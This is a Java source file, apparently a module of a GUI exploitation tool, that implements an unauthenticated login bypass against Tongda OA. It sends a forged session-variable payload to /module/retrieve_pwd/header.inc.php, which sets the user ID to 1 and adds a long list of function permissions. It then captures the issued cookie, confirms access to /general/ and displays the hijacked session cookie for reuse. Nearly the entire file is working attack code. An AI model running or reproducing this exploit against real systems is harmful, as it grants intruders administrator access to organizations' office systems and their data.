package exp.oa.tongdaoa;
import com.github.kevinsawicki.http.HttpRequest;
import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import utils.HttpTools;
import utils.Response;

import java.io.IOException;
import java.util.HashMap;

public class tongda_header_Inc_unauth implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea,textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        Platform.runLater(()-> {
            textArea.appendText("\n 未授权访问需替换cookie");
            textArea.appendText("\n ");
        });
        return null;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }


    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {

        //判断漏洞目录是否存在
        String path = "/module/retrieve_pwd/header.inc.php";
        Response pathRequest = HttpTools.get(url+path,new HashMap<>(),"utf-8");
        if(pathRequest.getCode()!=200){
            Platform.runLater(()-> {
                textArea.appendText("\n 获取cookie失败");
                textArea.appendText("\n ");
            });
            return false;
        }else {
            //获取cookie
            HashMap head = new HashMap<>();
            head.put("Content-Type","application/x-www-form-urlencoded");
            String varData1 = "_SESSION[LOGIN_THEME]=15&_SESSION[LOGIN_USER_ID]=1&_SESSION[LOGIN_UID]=1&_SESSION[LOGIN_FUNC_STR]=1,3,42,643,644,634,4,147,148,7,8,9,10,16,11,130,5,131,132,256,229,182,183,194,637,134,37,135,136,226,253,254,255,536,24,196,105,119,80,96,97,98,114,126,179,607,539,251,127,238,128,85,86,87,88,89,137,138,222,90,91,92,152,93,94,95,118,237,108,109,110,112,51,53,54,153,217,150,239,240,218,219,43,17,18,19,15,36,70,76,77,115,116,185,235,535,59,133,64,257,2,74,12,68,66,67,13,14,40,41,44,75,27,60,61,481,482,483,484,485,486,487,488,489,490,491,492,120,494,495,496,497,498,499,500,501,502,503,505,504,26,506,507,508,515,537,122,123,124,628,125,630,631,632,633,55,514,509,29,28,129,510,511,224,39,512,513,252,230,231,232,629,233,234,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,200,202,201,203,204,205,206,207,208,209,65,187,186,188,189,190,191,606,192,193,221,550,551,73,62,63,34,532,548,640,641,642,549,601,600,602,603,604,46,21,22,227,56,30,31,33,32,605,57,609,103,146,107,197,228,58,538,151,6,534,69,71,72,223,639,";
            Response getRequest=HttpTools.post(url+path,varData1,head,"utf-8");
            HttpRequest getCookieRequest=HttpRequest.post(url+path)
                    .trustAllCerts()
                    .trustAllHosts()
                    .send("_SESSION[LOGIN_THEME]=15&_SESSION[LOGIN_USER_ID]=1&_SESSION[LOGIN_UID]=1&_SESSION[LOGIN_FUNC_STR]=1,3,42,643,644,634,4,147,148,7,8,9,10,16,11,130,5,131,132,256,229,182,183,194,637,134,37,135,136,226,253,254,255,536,24,196,105,119,80,96,97,98,114,126,179,607,539,251,127,238,128,85,86,87,88,89,137,138,222,90,91,92,152,93,94,95,118,237,108,109,110,112,51,53,54,153,217,150,239,240,218,219,43,17,18,19,15,36,70,76,77,115,116,185,235,535,59,133,64,257,2,74,12,68,66,67,13,14,40,41,44,75,27,60,61,481,482,483,484,485,486,487,488,489,490,491,492,120,494,495,496,497,498,499,500,501,502,503,505,504,26,506,507,508,515,537,122,123,124,628,125,630,631,632,633,55,514,509,29,28,129,510,511,224,39,512,513,252,230,231,232,629,233,234,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,200,202,201,203,204,205,206,207,208,209,65,187,186,188,189,190,191,606,192,193,221,550,551,73,62,63,34,532,548,640,641,642,549,601,600,602,603,604,46,21,22,227,56,30,31,33,32,605,57,609,103,146,107,197,228,58,538,151,6,534,69,71,72,223,639,");
            String cookie=getCookieRequest.header("Set-Cookie");
            path="/general/";
            Document document = null;
            try {
                document = Jsoup.connect(url + path).ignoreHttpErrors(true).header("Cookie",cookie).get();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            if (document.title().equals("用户未登录")){
                Platform.runLater(()-> {
                    textArea.appendText("\n 登录认证绕过失败");
                    textArea_cmd.appendText("\n Cookie: "+cookie);
                    textArea.appendText("\n ");
                });
                return false;
            }else {
                Platform.runLater(()-> {
                    textArea.appendText("\n [ tongda_header_Inc_unauth ]");
                    textArea.appendText("\n 登录认证绕过成功");
                    textArea_cmd.appendText("\n url: "+url+"/general/");
                    textArea_cmd.appendText("\n Cookie: "+cookie);
                    textArea.appendText("\n ");
                });
                return true;
            }
        }
    }
}
